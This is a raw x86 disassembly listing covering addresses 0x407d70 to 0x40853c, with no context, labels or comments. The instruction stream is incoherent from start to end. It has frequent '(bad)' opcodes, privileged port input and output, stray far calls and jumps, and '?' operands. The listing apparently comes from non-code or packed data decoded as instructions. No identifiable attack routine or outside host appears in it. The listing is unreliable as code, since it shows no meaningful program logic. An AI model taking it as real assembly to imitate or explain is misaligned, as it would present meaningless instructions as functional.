  407d70:	shr    BYTE PTR [ebx+0x69],cl
  407d73:	cli    
  407d74:	popf   
  407d75:	xchg   edx,eax
  407d76:	pop    esi
  407d77:	retf   
  407d78:	ror    BYTE PTR [edx+0x5],1
  407d7b:	in     eax,dx
  407d7c:	xchg   esi,eax
  407d7d:	and    cl,BYTE PTR [ebp+0x14]
  407d80:	dec    edx
  407d81:	sub    DWORD PTR [edx],edi
  407d83:	popf   
  407d84:	cs mov ebp,0xaf5e80fe
  407d8a:	dec    edi
  407d8b:	stos   DWORD PTR es:[edi],eax
  407d8c:	fnsave [esi+0x26]
  407d8f:	xchg   BYTE PTR [edi+0x13],ah
  407d92:	mov    cl,0x92
  407d94:	push   ds
  407d95:	gs push esi
  407d97:	test   ch,ch
  407d99:	ficomp WORD PTR [eax+ebp*4]
  407d9c:	or     eax,0x43826aae
  407da1:	clc    
  407da2:	push   ds
  407da3:	pop    ds
  407da4:	fild   WORD PTR [edx+eax*4]
  407da7:	cmp    al,0xcf
  407da9:	(bad)  
  407dab:	fucom  st(5)
  407dad:	imul   ch
  407daf:	fistp  DWORD PTR [esp+edi*4+0x78]
  407db3:	icebp  
  407db4:	ret    
  407db5:	(bad)  
  407db7:	cld    
  407db8:	lock out 0x9e,eax
  407dbb:	jnp    0x407dab
  407dbd:	mov    ecx,0xc7d8fe5f
  407dc2:	imul   BYTE PTR ds:[ebp-0x28690a05]
  407dc9:	add    BYTE PTR [eax-0x71],dh
  407dcc:	mov    ds:0x8c31e492,al
  407dd1:	jno    0x407e10
  407dd3:	ds out dx,al
  407dd5:	test   DWORD PTR [edx],ebp
  407dd7:	sub    DWORD PTR [ecx+0x52],edx
  407dda:	jb     0x407e0c
  407ddc:	fsubrp st(7),st
  407dde:	neg    BYTE PTR [esi-0x21790640]
  407de4:	mov    DWORD PTR [esp+ebp*2],esi
  407de7:	jae    0x407e51
  407de9:	hlt    
  407dea:	in     al,0xf7
  407dec:	leave  
  407ded:	push   edi
  407dee:	adc    ah,bh
  407df0:	add    BYTE PTR ds:0xa42ad876,dl
  407df6:	mov    ecx,0x3ee02318
  407dfb:	(bad)  
  407dfc:	cmp    dh,BYTE PTR [edx-0x5f]
  407dff:	mov    ebp,0x845d62f2
  407e04:	xor    DWORD PTR [ecx-0x30],edx
  407e07:	dec    esi
  407e08:	mov    eax,ds:0xa92482d3
  407e0d:	xchg   ebx,eax
  407e0e:	or     eax,0x31663b8b
  407e13:	or     cl,0x1d
  407e16:	imul   ecx,DWORD PTR [ebp+edi*8-0x45],0xffffff89
  407e1b:	rol    ecx,0x2e
  407e1e:	fadd   DWORD PTR [edx+0x60]
  407e21:	adc    DWORD PTR [ebp-0x47],esp
  407e24:	xor    BYTE PTR [ecx],ch
  407e26:	mov    WORD PTR [edi],?
  407e28:	and    eax,0xae5ca8ca
  407e2d:	inc    ecx
  407e2e:	imul   eax,DWORD PTR [ecx-0x66baf64f],0x50
  407e35:	call   0x4ac45868
  407e3a:	pusha  
  407e3b:	and    BYTE PTR [ebp+0x9],ah
  407e3e:	sti    
  407e3f:	and    eax,0xcd8d6aec
  407e44:	dec    ebx
  407e45:	int3   
  407e46:	mov    esp,0x484dee40
  407e4b:	les    eax,FWORD PTR [esp+eax*4+0x40791d39]
  407e52:	push   edi
  407e53:	out    dx,al
  407e54:	xchg   ebx,eax
  407e55:	xor    BYTE PTR [edi-0x58167363],ah
  407e5b:	pop    ss
  407e5c:	push   0x22692525
  407e61:	sbb    ah,dh
  407e63:	mov    ebx,0x3a1dbb74
  407e68:	in     eax,dx
  407e69:	push   cs
  407e6a:	(bad)  [esi-0x69]
  407e6d:	(bad)  
  407e6e:	pusha  
  407e6f:	dec    eax
  407e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e71:	(bad)  [ecx-0x7d]
  407e74:	mov    bh,0x92
  407e76:	adc    al,0xa5
  407e78:	pop    esp
  407e79:	mov    eax,0xab0f6633
  407e7e:	and    BYTE PTR [edx],0x96
  407e81:	cwde   
  407e82:	cmp    eax,0xa6fd7b34
  407e87:	fbld   TBYTE PTR [ecx-0xc19f5d8]
  407e8d:	cmp    DWORD PTR [ecx-0x6e],ecx
  407e90:	jo     0x407e77
  407e92:	retf   0x8615
  407e95:	ret    
  407e96:	loope  0x407e9b
  407e98:	fwait
  407e99:	fwait
  407e9a:	fwait
  407e9b:	dec    DWORD PTR [ebx]
  407e9d:	lock imul esi,edi,0xffffffa7
  407ea1:	and    DWORD PTR [ecx+eax*1-0x253a2120],ebp
  407ea8:	inc    edi
  407ea9:	inc    edx
  407eaa:	ror    BYTE PTR [edi+0x10],cl
  407ead:	test   eax,0xe295214
  407eb2:	mov    DWORD PTR [edi-0x29d273e4],0xc675e3ca
  407ebc:	ret    0x30ba
  407ebf:	pop    esp
  407ec0:	inc    ebp
  407ec1:	fucomip st,st(7)
  407ec3:	fcmovne st,st(5)
  407ec5:	push   edx
  407ec6:	mov    edi,0xde4ac091
  407ecb:	push   es
  407ecc:	pop    ebx
  407ecd:	mov    BYTE PTR [ebx+0x71],bh
  407ed0:	lea    ebx,[ebx]
  407ed2:	je     0x407f38
  407ed4:	fdivr  QWORD PTR [ecx]
  407ed6:	xchg   esp,eax
  407ed7:	add    al,0x95
  407ed9:	clc    
  407eda:	dec    edi
  407edb:	adc    eax,DWORD PTR [eax]
  407edd:	ins    BYTE PTR es:[edi],dx
  407ede:	std    
  407edf:	jnp    0x407ee1
  407ee1:	test   DWORD PTR [eax+0x3a3d60b9],edx
  407ee7:	cwde   
  407ee8:	call   0x9b823f00
  407eed:	add    eax,0x30a00408
  407ef2:	mov    dh,0xe
  407ef4:	push   es
  407ef5:	inc    ecx
  407ef6:	mov    ecx,0x498a9943
  407efb:	inc    esp
  407efc:	sub    al,0xc3
  407efe:	clc    
  407eff:	repz mov eax,0x14630aed
  407f05:	mov    ecx,0x397936e
  407f0a:	or     bh,BYTE PTR [edi-0x519ed741]
  407f10:	or     eax,0x535894c6
  407f15:	nop
  407f16:	in     al,0x13
  407f18:	xchg   edx,eax
  407f19:	fdiv   QWORD PTR [ecx+0x3ec1ee87]
  407f1f:	ins    DWORD PTR es:[edi],dx
  407f20:	mov    ecx,0xda73348f
  407f25:	jmp    0xca5a:0x2deb5e80
  407f2c:	mov    al,ds:0x6bd065a4
  407f31:	shr    ebx,cl
  407f33:	ja     0x407f1e
  407f35:	mov    ah,0x3b
  407f37:	hlt    
  407f38:	jp     0x407f97
  407f3a:	push   es
  407f3b:	and    DWORD PTR [ecx],0xffffff9d
  407f3e:	outs   dx,BYTE PTR ds:[esi]
  407f3f:	xchg   edi,eax
  407f40:	dec    esi
  407f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f42:	dec    ebx
  407f43:	mov    ebx,0x4a946dd
  407f48:	test   eax,0xa790fa4
  407f4d:	call   0xdf54:0x1e88d058
  407f54:	arpl   WORD PTR [eax],si
  407f56:	leave  
  407f57:	repz mov esp,0xe18c6b2a
  407f5d:	fidiv  DWORD PTR [ebp-0x5cb97395]
  407f63:	mov    edi,0xcf73dcf8
  407f68:	jne    0x407fa8
  407f6a:	div    BYTE PTR [ecx-0x38e82271]
  407f70:	loopne 0x407f8c
  407f72:	add    dh,ch
  407f74:	inc    ecx
  407f75:	(bad)  
  407f76:	jecxz  0x407ff7
  407f78:	cld    
  407f79:	(bad)
  407f7d:	mov    ebp,0xf4a702
  407f82:	push   esp
  407f83:	jbe    0x407f21
  407f85:	in     eax,0xd6
  407f87:	in     eax,dx
  407f88:	cmp    eax,0x1f5da70e
  407f8d:	push   ebx
  407f8e:	paddw  mm3,QWORD PTR [esi-0x33]
  407f92:	add    DWORD PTR [eax],edx
  407f94:	and    eax,0xf9bdc4ee
  407f99:	jge    0x407f3f
  407f9b:	out    dx,al
  407f9c:	(bad)  
  407f9d:	cli    
  407f9e:	imul   eax,edi,0xffffffe6
  407fa1:	sar    DWORD PTR ds:0x939181d,0x1b
  407fa8:	test   DWORD PTR [ebx+ebp*8-0x17494b77],0x961792d2
  407fb3:	cmp    al,0x77
  407fb5:	dec    edx
  407fb6:	arpl   sp,si
  407fb8:	ret    0x21ad
  407fbb:	jno    0x408023
  407fbd:	inc    eax
  407fbe:	repz jbe 0x407fab
  407fc1:	mov    al,BYTE PTR [bx+si+0x6fc0]
  407fc6:	lods   al,BYTE PTR ds:[esi]
  407fc7:	rol    cl,0x2e
  407fca:	mov    dh,0x99
  407fcc:	js     0x408029
  407fce:	or     al,0xc
  407fd0:	jle    0x407f8d
  407fd2:	mov    es,WORD PTR [eax]
  407fd4:	sub    DWORD PTR [esi],eax
  407fd6:	pop    es
  407fd7:	jecxz  0x407f76
  407fd9:	nop
  407fda:	aad    0xef
  407fdc:	cwde   
  407fdd:	pop    ecx
  407fde:	call   0x11016fa8
  407fe3:	ret    0xeef1
  407fe6:	mov    ebx,0xa5169b44
  407feb:	outs   dx,BYTE PTR ds:[esi]
  407fec:	xchg   ecx,eax
  407fed:	xchg   edi,eax
  407fee:	jge    0x408047
  407ff0:	(bad)  
  407ff1:	sti    
  407ff2:	and    BYTE PTR [esi],ah
  407ff4:	(bad)  
  407ff5:	pusha  
  407ff6:	mov    WORD PTR [esi],es
  407ff8:	xchg   ebx,eax
  407ff9:	xchg   ebx,eax
  407ffa:	mov    BYTE PTR [ecx],ch
  407ffc:	dec    edx
  407ffd:	iret   
  407ffe:	push   ecx
  407fff:	cmp    ah,BYTE PTR [ebx]
  408001:	fnstsw WORD PTR [ebx]
  408003:	inc    esp
  408004:	in     al,dx
  408005:	cmp    ah,BYTE PTR [eax-0x5896b3b0]
  40800b:	pop    es
  40800c:	and    al,0x52
  40800e:	xchg   ebx,eax
  40800f:	dec    eax
  408010:	ret    
  408011:	inc    esi
  408012:	dec    edi
  408013:	xor    eax,ebp
  408015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408016:	hlt    
  408017:	mov    edx,0xebdfa2d
  40801c:	in     eax,dx
  40801d:	jbe    0x407faa
  40801f:	inc    esp
  408020:	and    eax,0xda424924
  408025:	push   0xffffff91
  408027:	and    al,0x2d
  408029:	rcl    BYTE PTR [esi-0x65],cl
  40802c:	shl    DWORD PTR [eax-0x50],0x70
  408030:	sub    BYTE PTR [ebx+0x5a608500],dh
  408036:	sbb    al,0x1e
  408038:	push   ds
  408039:	mov    ds:0x50254bb5,al
  40803e:	dec    edx
  40803f:	xor    DWORD PTR [esi],ebx
  408041:	(bad)  
  408042:	cdq    
  408043:	dec    esp
  408044:	es (bad) 
  408047:	push   es
  408048:	add    DWORD PTR [edi-0x20523c90],0xffffffb1
  40804f:	lods   al,BYTE PTR ds:[esi]
  408050:	add    eax,esp
  408052:	push   ds
  408053:	and    al,0x4d
  408055:	shr    DWORD PTR [ebp+0x9],cl
  408058:	out    dx,eax
  408059:	xor    edx,esi
  40805b:	add    BYTE PTR cs:[eax],al
  40805e:	stos   BYTE PTR es:[edi],al
  40805f:	mov    eax,ds:0xddaed7b6
  408064:	bound  edx,QWORD PTR [esi-0x344caf93]
  40806a:	jecxz  0x4080dc
  40806c:	fcmovnu st,st(3)
  40806e:	jb     0x408070
  408070:	inc    esi
  408071:	out    0x40,al
  408073:	ror    DWORD PTR [eax+esi*4],cl
  408076:	jle    0x408017
  408078:	cmp    BYTE PTR [esi-0x31],cl
  40807b:	mov    esi,0x2803c14a
  408080:	ror    DWORD PTR [eax-0x6c9577ea],1
  408086:	add    eax,0xcc33d61f
  40808b:	xor    ecx,ecx
  40808d:	cmp    al,0xb3
  40808f:	int3   
  408090:	xor    ecx,DWORD PTR [ebx+0x5e]
  408093:	or     BYTE PTR [edx+0x53],cl
  408096:	push   edi
  408097:	hlt    
  408098:	fmul   DWORD PTR [eax+ebx*2]
  40809b:	in     eax,0x7f
  40809d:	ins    BYTE PTR es:[edi],dx
  40809e:	ret    0x7c52
  4080a1:	lods   al,BYTE PTR ds:[esi]
  4080a2:	mov    DWORD PTR [edx],ecx
  4080a4:	fdivr  DWORD PTR [eax+0x6ae857ac]
  4080aa:	jnp    0x4080bf
  4080ac:	cmp    BYTE PTR [edx],bl
  4080ae:	mov    edi,0x303db44d
  4080b3:	or     eax,0x8af85383
  4080b8:	popa   
  4080b9:	inc    esp
  4080ba:	inc    eax
  4080bb:	adc    DWORD PTR [ebx],eax
  4080bd:	dec    ecx
  4080be:	push   eax
  4080bf:	jl     0x40812c
  4080c1:	push   ss
  4080c2:	mov    WORD PTR [ebx+0x246312d4],fs
  4080c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080c9:	dec    ebp
  4080ca:	sub    ebx,ecx
  4080cc:	inc    dl
  4080ce:	dec    edi
  4080cf:	popa   
  4080d0:	push   ss
  4080d1:	dec    esp
  4080d2:	and    eax,0x9750e12f
  4080d7:	push   0x8d4b625d
  4080dc:	fstp   QWORD PTR [edi-0x4ef089df]
  4080e2:	in     eax,0x1c
  4080e4:	imul   ecx,DWORD PTR [esi],0xa47dcae9
  4080ea:	cdq    
  4080eb:	mov    eax,ds:0x209848c8
  4080f0:	in     eax,dx
  4080f1:	test   BYTE PTR [esi+0x4b],cl
  4080f4:	icebp  
  4080f5:	mov    bh,0xff
  4080f7:	neg    bh
  4080f9:	inc    edx
  4080fa:	test   eax,0x1fef52ee
  4080ff:	cld    
  408100:	add    al,0xb7
  408102:	outs   dx,BYTE PTR ds:[esi]
  408103:	frstor [edx]
  408105:	iret   
  408106:	jae    0x40815a
  408108:	aas    
  408109:	ret    
  40810a:	push   esp
  40810b:	pop    ecx
  40810c:	xchg   esi,eax
  40810d:	in     al,dx
  40810e:	out    dx,al
  40810f:	out    dx,al
  408110:	mov    dh,0x37
  408112:	ss ss push ds
  408115:	arpl   WORD PTR ds:0x79503f00,cx
  40811b:	dec    eax
  40811c:	dec    eax
  40811d:	fst    DWORD PTR [ecx-0x2a]
  408120:	(bad)  
  408121:	aad    0xcd
  408123:	xchg   DWORD PTR [eax],eax
  408125:	scas   eax,DWORD PTR es:[edi]
  408126:	pop    esi
  408127:	(bad)  [ebx]
  408129:	iret   
  40812a:	dec    edi
  40812b:	lock into 
  40812d:	ins    BYTE PTR es:[edi],dx
  40812e:	hlt    
  40812f:	add    BYTE PTR [esi],dl
  408131:	push   es
  408132:	test   BYTE PTR [edx+0x28],ch
  408135:	in     al,0x3b
  408137:	xchg   esp,eax
  408138:	pop    edx
  408139:	scas   al,BYTE PTR es:[edi]
  40813a:	shl    DWORD PTR [ecx-0x68],0x87
  40813e:	jne    0x40810a
  408140:	fs sub al,0x46
  408143:	or     ecx,DWORD PTR [edx+0x20cf32c2]
  408149:	retf   
  40814a:	pop    ebp
  40814b:	mov    ds:0x283b340f,eax
  408150:	loopne 0x40812f
  408152:	or     BYTE PTR [esi],0xa2
  408155:	icebp  
  408156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408157:	jb     0x408190
  408159:	pop    eax
  40815a:	lahf   
  40815b:	out    dx,eax
  40815c:	sbb    BYTE PTR [ecx-0x70a41de1],bh
  408162:	lea    esp,[ebx+0x2e220c55]
  408168:	sbb    eax,DWORD PTR [ebx+0x23e5541]
  40816e:	xchg   eax,ebx
  408170:	in     al,dx
  408171:	mov    al,0xd4
  408173:	pop    ecx
  408174:	inc    esp
  408175:	pusha  
  408176:	or     al,0xc1
  408178:	push   edi
  408179:	shl    DWORD PTR [esi+ebx*2-0x3a],1
  40817d:	mov    WORD PTR [edx-0x590fc8ce],fs
  408183:	xchg   ecx,eax
  408184:	dec    ecx
  408185:	cld    
  408186:	pop    es
  408187:	repnz mov dl,0x4f
  40818a:	pop    esi
  40818b:	sahf   
  40818c:	mov    al,ds:0xb01590d0
  408191:	cmp    esi,DWORD PTR [edi]
  408193:	int3   
  408194:	out    0x25,eax
  408196:	mov    bl,0xac
  408198:	and    BYTE PTR [edi+0x5e25384f],bl
  40819e:	loopne 0x4081c7
  4081a0:	aaa    
  4081a1:	scas   eax,DWORD PTR es:[edi]
  4081a2:	xchg   edx,eax
  4081a3:	and    al,0x49
  4081a5:	xchg   ebp,eax
  4081a6:	and    bl,BYTE PTR ds:0xdb61fef7
  4081ac:	ins    BYTE PTR es:[edi],dx
  4081ad:	ss pop ebx
  4081af:	retf   0xc83b
  4081b2:	mov    dl,0xcc
  4081b4:	pop    eax
  4081b5:	imul   ebp,edi,0x5b
  4081b8:	pop    esi
  4081b9:	rcr    BYTE PTR [edx],0x0
  4081bc:	out    dx,al
  4081bd:	inc    ecx
  4081be:	je     0x408219
  4081c0:	mov    esi,0x895ab547
  4081c5:	push   esp
  4081c6:	retf   0x9185
  4081c9:	lods   al,BYTE PTR ds:[esi]
  4081ca:	fwait
  4081cb:	jl     0x408210
  4081cd:	dec    edx
  4081ce:	dec    ecx
  4081cf:	sahf   
  4081d0:	iret   
  4081d1:	mov    ecx,0x5cca6376
  4081d6:	mov    bh,0x8f
  4081d8:	ja     0x4081ac
  4081da:	pop    eax
  4081db:	shr    DWORD PTR [ebp+0x40c98778],0x31
  4081e2:	ror    DWORD PTR [eax+0x577bf47b],cl
  4081e8:	hlt    
  4081e9:	sbb    bh,al
  4081eb:	inc    esp
  4081ec:	neg    DWORD PTR [eax+0x39]
  4081ef:	in     eax,dx
  4081f0:	mov    ah,0x8b
  4081f2:	fbld   TBYTE PTR [edi+0x5]
  4081f5:	int3   
  4081f6:	jae    0x4081c0
  4081f8:	jae    0x408269
  4081fa:	sbb    DWORD PTR [ebx],0x6f
  4081fd:	iret   
  4081fe:	stos   DWORD PTR es:[edi],eax
  4081ff:	lds    ebp,FWORD PTR [ecx-0x12]
  408202:	sub    BYTE PTR [ebx],ch
  408204:	div    BYTE PTR [edi]
  408206:	sbb    eax,0xd222cd88
  40820b:	pop    ds
  40820c:	mov    bh,0x8a
  40820e:	inc    ecx
  40820f:	sbb    al,0xc9
  408211:	sub    bl,BYTE PTR [edx]
  408213:	sti    
  408214:	xchg   esi,eax
  408215:	fadd   DWORD PTR [ebx]
  408217:	or     esp,DWORD PTR [eax-0x78]
  40821a:	cdq    
  40821b:	inc    esp
  40821c:	int3   
  40821d:	and    BYTE PTR [edx],al
  40821f:	imul   ebp,DWORD PTR [eax+0x186220c0],0x1
  408226:	sbb    al,0x82
  408228:	pop    ecx
  408229:	push   edx
  40822a:	cdq    
  40822b:	sbb    ch,ah
  40822d:	and    al,BYTE PTR [edx+0x11]
  408230:	add    al,ah
  408232:	xor    BYTE PTR [ebx-0x1ce90cb4],dl
  408238:	jns    0x4081c5
  40823a:	mov    ebp,0xd89e9f71
  40823f:	out    0x91,al
  408241:	xchg   DWORD PTR [ebx-0x2e],edx
  408244:	xor    al,0xa5
  408246:	sub    al,0xb5
  408248:	scas   eax,DWORD PTR es:[edi]
  408249:	cmp    DWORD PTR [edx+0x44],0xffffffa1
  40824d:	hlt    
  40824e:	jmp    0x40829b
  408250:	xor    al,0x23
  408252:	or     DWORD PTR [ebp+0x59],esp
  408255:	push   ss
  408256:	pop    edx
  408257:	jmp    0x408234
  408259:	ja     0x408204
  40825b:	in     eax,0x7b
  40825d:	xchg   esi,eax
  40825e:	xor    eax,0x2883dc00
  408263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408264:	fiadd  WORD PTR [edi+0x200735b5]
  40826a:	mov    eax,0x6f374041
  40826f:	in     al,dx
  408270:	jno    0x40825d
  408272:	sbb    BYTE PTR ss:[ebx+0x3c02111e],dl
  408279:	call   0xb595:0x565ddf62
  408280:	mov    esp,0xaa2e4e3
  408285:	sbb    al,0x7c
  408287:	stos   DWORD PTR es:[edi],eax
  408288:	mov    edi,0x8c58f823
  40828d:	adc    eax,0x265b31be
  408292:	push   ebx
  408293:	ret    
  408294:	sub    bl,BYTE PTR fs:[eax-0x41a6fa34]
  40829b:	call   0x70e415a9
  4082a0:	ins    BYTE PTR es:[edi],dx
  4082a1:	aad    0xed
  4082a3:	(bad)  
  4082a5:	jbe    0x408242
  4082a7:	mov    ebx,0xa2f8a444
  4082ac:	push   ecx
  4082ad:	loopne 0x40831d
  4082af:	clc    
  4082b0:	push   esi
  4082b1:	push   ebp
  4082b2:	jns    0x4082c0
  4082b4:	push   ds
  4082b5:	jbe    0x40827c
  4082b7:	ja     0x408338
  4082b9:	out    dx,eax
  4082ba:	loope  0x408254
  4082bc:	cmp    BYTE PTR es:[edx+esi*2-0x4bbc7eb],al
  4082c4:	lea    esp,[edi+0x1]
  4082c7:	and    DWORD PTR [edx+0x62],ebx
  4082ca:	lods   al,BYTE PTR ds:[esi]
  4082cb:	push   ebx
  4082cc:	cld    
  4082cd:	ret    0xc083
  4082d0:	cmp    al,0x87
  4082d2:	ret    
  4082d3:	sbb    DWORD PTR [edi+eiz*2+0x368052d0],ecx
  4082da:	or     al,0xed
  4082dc:	pushf  
  4082dd:	lea    eax,[ecx+0xf]
  4082e0:	sub    DWORD PTR [esi+edx*8],esp
  4082e3:	xchg   esi,eax
  4082e4:	sub    esi,ebx
  4082e6:	pop    es
  4082e7:	repnz cmp al,0x67
  4082ea:	jg     0x40836b
  4082ec:	mov    edi,0x4a520006
  4082f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082f2:	shr    DWORD PTR [ecx-0x41082103],cl
  4082f8:	mov    bh,0x66
  4082fa:	add    BYTE PTR [edi],bh
  4082fc:	dec    eax
  4082fd:	dec    ecx
  4082fe:	xchg   edx,eax
  4082ff:	in     al,0xa4
  408301:	rcr    edx,1
  408303:	lea    eax,[ecx]
  408305:	mov    BYTE PTR [esi+0x1],al
  408308:	sub    ch,BYTE PTR [ecx]
  40830a:	cmp    DWORD PTR [eax],edi
  40830c:	fsub   DWORD PTR [edi-0x1]
  40830f:	inc    eax
  408310:	xor    ch,0xc3
  408313:	and    BYTE PTR [ebx+0x7b],0xff
  408317:	pop    esi
  408318:	jns    0x40838b
  40831a:	fsub   QWORD PTR [edx]
  40831c:	imul   eax,edi,0xffffffbd
  40831f:	popf   
  408320:	fidivr WORD PTR [eax+eax*4]
  408323:	xor    ecx,0x1a
  408326:	sbb    DWORD PTR [ebx],edi
  408328:	sbb    eax,0x2cb4aa6b
  40832d:	mov    eax,ds:0xb18e3755
  408332:	push   ss
  408333:	mov    WORD PTR [esi+0x32cc0514],?
  408339:	cwde   
  40833a:	into   
  40833b:	sub    eax,0x163b9b3
  408340:	test   DWORD PTR [esi+0x61c9a796],eax
  408346:	cmp    al,BYTE PTR [ebx-0x30e4c606]
  40834c:	fcmovu st,st(4)
  40834e:	(bad)  
  40834f:	xchg   esp,eax
  408350:	jecxz  0x40830c
  408352:	xor    bl,BYTE PTR [edx+0x10011e87]
  408358:	dec    ebp
  408359:	repz and edi,DWORD PTR [esi]
  40835c:	push   edi
  40835d:	add    BYTE PTR [ecx-0x4f9d9a1a],al
  408363:	mov    ch,cl
  408365:	mov    bh,BYTE PTR [eax+0x7f]
  408368:	xor    BYTE PTR ds:0xf5a10662,ah
  40836e:	and    bh,cl
  408370:	imul   edx,esi,0x2912d172
  408376:	fdivr  QWORD PTR [esi+0x75f4d73c]
  40837c:	xchg   BYTE PTR [edx-0x63],dl
  40837f:	push   0x10
  408381:	push   esp
  408382:	dec    esp
  408383:	std    
  408384:	inc    ebx
  408385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408386:	imul   ebx,DWORD PTR [ecx-0x6a],0x2fefefec
  40838d:	and    eax,0xf7ad6914
  408392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408393:	shr    ecx,cl
  408395:	mov    ch,0xbb
  408397:	aam    0xd2
  408399:	cmp    eax,0xee001acb
  40839e:	inc    ecx
  40839f:	lods   al,BYTE PTR ds:[esi]
  4083a0:	mov    ch,0x43
  4083a2:	and    dh,0x52
  4083a5:	pusha  
  4083a6:	inc    edx
  4083a7:	dec    edx
  4083a8:	mov    BYTE PTR [edi+0x130e0e13],0x17
  4083af:	sbb    bh,BYTE PTR [ebx]
  4083b1:	lea    ecx,ss:[edi-0x41388763]
  4083b8:	sub    edi,DWORD PTR [edi-0x54]
  4083bb:	xor    WORD PTR [edi],ax
  4083be:	sar    DWORD PTR [ebp+0x7575131c],0x95
  4083c5:	(bad)  
  4083c6:	fcomp  QWORD PTR [ecx-0x26a4c7b7]
  4083cc:	push   edx
  4083cd:	xchg   esp,eax
  4083ce:	or     dh,BYTE PTR cs:[eax]
  4083d1:	iret   
  4083d2:	pusha  
  4083d3:	sahf   
  4083d4:	cmp    eax,DWORD PTR [edi+0x60]
  4083d7:	mov    BYTE PTR [eax],cl
  4083d9:	sbb    BYTE PTR [ebx],cl
  4083db:	mov    dl,0x79
  4083dd:	call   0x9a7f:0x5de02a6
  4083e4:	mov    bh,0xf8
  4083e6:	mov    dh,0xc4
  4083e8:	pop    ds
  4083e9:	pop    edi
  4083ea:	xchg   esi,eax
  4083eb:	and    eax,0x90a468c6
  4083f0:	push   esp
  4083f1:	sub    edi,DWORD PTR [eax]
  4083f3:	xor    eax,0xc808ddaf
  4083f8:	les    ebx,FWORD PTR [eax+0x2c]
  4083fb:	sbb    eax,eax
  4083fd:	mov    al,0x84
  4083ff:	shl    DWORD PTR [ebp+0x6076758d],1
  408405:	xchg   esp,eax
  408406:	arpl   WORD PTR [esi+0x4a],ax
  408409:	mov    ebx,0xe42516f3
  40840e:	push   es
  40840f:	pop    edx
  408410:	cmp    DWORD PTR [edx+edx*4+0x182a7e92],esi
  408417:	push   cs
  408418:	aaa    
  408419:	xor    DWORD PTR [edx+0x3f1b25c],edi
  40841f:	and    BYTE PTR [eax-0x53],ch
  408422:	xchg   edi,eax
  408423:	idiv   cl
  408425:	out    dx,eax
  408426:	push   edi
  408427:	test   BYTE PTR [eax],dl
  408429:	imul   eax,DWORD PTR [esi],0xfffffff0
  40842c:	adc    DWORD PTR [ecx+eiz*1],0xffffffe5
  408430:	mov    dh,0xd1
  408432:	sbb    bl,BYTE PTR [ecx]
  408434:	add    eax,DWORD PTR [eax-0x6794a7f0]
  40843a:	dec    esi
  40843b:	out    0x1c,al
  40843d:	into   
  40843e:	jp     0x408448
  408440:	popa   
  408441:	sbb    eax,0x94b66c8d
  408446:	call   0x2d51:0xdce81d7d
  40844d:	cld    
  40844e:	push   cs
  40844f:	lods   eax,DWORD PTR ds:[esi]
  408450:	jg     0x408477
  408452:	sub    edi,DWORD PTR [eax]
  408454:	jmp    0x3dc6:0x874ca3f8
  40845b:	aad    0x1e
  40845d:	xor    dh,al
  40845f:	loopne 0x40841b
  408461:	push   ss
  408462:	pop    ebx
  408463:	imul   edx,DWORD PTR [ecx],0xffffffd6
  408466:	mov    ds:0xcb6b408d,al
  40846b:	cmp    al,0xb7
  40846d:	mov    es,WORD PTR [ecx]
  40846f:	int3   
  408470:	sbb    al,0x10
  408472:	adc    al,0xe5
  408474:	ret    0x500c
  408477:	repnz or BYTE PTR [ebx],dh
  40847a:	loopne 0x4084b4
  40847c:	push   edx
  40847d:	stos   DWORD PTR es:[edi],eax
  40847e:	ret    
  40847f:	and    ecx,DWORD PTR [eax+0x64d511cf]
  408485:	lea    esp,[ecx+0x6f]
  408488:	out    dx,eax
  408489:	es xchg edi,eax
  40848b:	cs mov esp,0x5f37f9ce
  408491:	and    ecx,edi
  408493:	xor    edx,DWORD PTR [edx+edx*2+0x3c9b870c]
  40849a:	idiv   al
  40849c:	xchg   ebx,eax
  40849d:	pushf  
  40849e:	cmp    al,0xfd
  4084a0:	add    ch,bh
  4084a2:	rol    DWORD PTR [esi-0x13],0x52
  4084a6:	icebp  
  4084a7:	xor    eax,0xaed6a402
  4084ac:	fnstsw WORD PTR [eax+0x8be559f]
  4084b2:	lock push es
  4084b4:	pop    ecx
  4084b5:	enter  0xf073,0xaf
  4084b9:	dec    edx
  4084ba:	clc    
  4084bb:	pop    esi
  4084bc:	mov    edi,0x9ffa3895
  4084c1:	sub    BYTE PTR [eax-0x55],ch
  4084c4:	sbb    BYTE PTR [esi+0x6a],0x19
  4084c8:	or     al,0x6
  4084ca:	xchg   esp,eax
  4084cb:	arpl   WORD PTR ds:[eax-0x2b],si
  4084cf:	cld    
  4084d0:	push   es
  4084d1:	jns    0x408487
  4084d3:	mov    edx,0x781dbc54
  4084d8:	jmp    0x4084f9
  4084da:	inc    bl
  4084dc:	jg     0x408536
  4084de:	lods   al,BYTE PTR ds:[esi]
  4084df:	mov    eax,0x6b25b785
  4084e4:	add    BYTE PTR [eax+0x73ee7c8b],bh
  4084ea:	lahf   
  4084eb:	xchg   ebx,eax
  4084ec:	dec    edx
  4084ed:	retf   0x2513
  4084f0:	ds pop es
  4084f2:	and    BYTE PTR [eax+ebp*1-0x21238d64],bh
  4084f9:	popf   
  4084fa:	xor    bl,BYTE PTR [edi-0x22b1af47]
  408500:	(bad)  
  408501:	aas    
  408502:	mov    ss,WORD PTR [esi]
  408504:	xor    al,0x4c
  408506:	xchg   DWORD PTR [eax-0x1825b87c],esp
  40850c:	add    DWORD PTR [edx+eax*1+0x28],edx
  408510:	js     0x408538
  408512:	ror    DWORD PTR [esp+ebx*1+0x55f9d12c],1
  408519:	(bad)  
  40851a:	(bad)  
  40851c:	(bad)  
  40851d:	cmp    BYTE PTR [ecx+ebx*2+0x6d],bh
  408521:	aaa    
  408522:	sbb    BYTE PTR [ebx+0x6ccb0a28],ch
  408528:	outs   dx,BYTE PTR ds:[esi]
  408529:	cdq    
  40852a:	into   
  40852b:	sub    al,0x87
  40852d:	xor    ecx,ebx
  40852f:	je     0x40855f
  408531:	enter  0x2832,0x3b
  408535:	or     ecx,DWORD PTR [edi+0x79]
  408538:	lea    esp,[ecx-0x5]
  40853b:	push   ebx
  40853c:	or     dh,BYTE PTR [ecx-0x15c64e50]
